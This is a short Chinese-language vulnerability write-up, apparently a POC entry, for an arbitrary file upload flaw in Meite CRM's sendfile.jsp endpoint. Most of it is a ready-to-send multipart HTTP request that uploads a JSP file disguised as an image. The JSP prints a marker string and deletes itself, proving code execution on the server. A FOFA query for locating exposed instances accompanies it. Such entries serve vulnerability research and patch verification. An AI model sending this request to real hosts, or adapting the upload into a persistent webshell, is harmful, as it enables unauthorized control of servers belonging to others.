## 美特CRM sendfile 任意文件上传漏洞

## 漏洞描述
美特CRM `sendfile.jsp` 接口缺乏严格校验，攻击者可上传任意脚本文件并通过特定路径访问执行，最终控制服务器。

## 网络空间测绘
```
fofa: body="/common/scripts/basic.js"
```

## POC
```
POST /business/common/importdata/sendfile.jsp HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---WebKitFormBoundarypZBE5JAFBhWD8TNo
Content-Length: 315

---WebKitFormBoundarypZBE5JAFBhWD8TNo
Content-Disposition: form-data; name="file"; filename="4hbk2u.jsp"
Content-Type: image/jpeg

<%out.println("pboyjnnrfipmplsukdeczudsefXmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>

---WebKitFormBoundarypZBE5JAFBhWD8TNo--
```


## 参考
- 社区情报

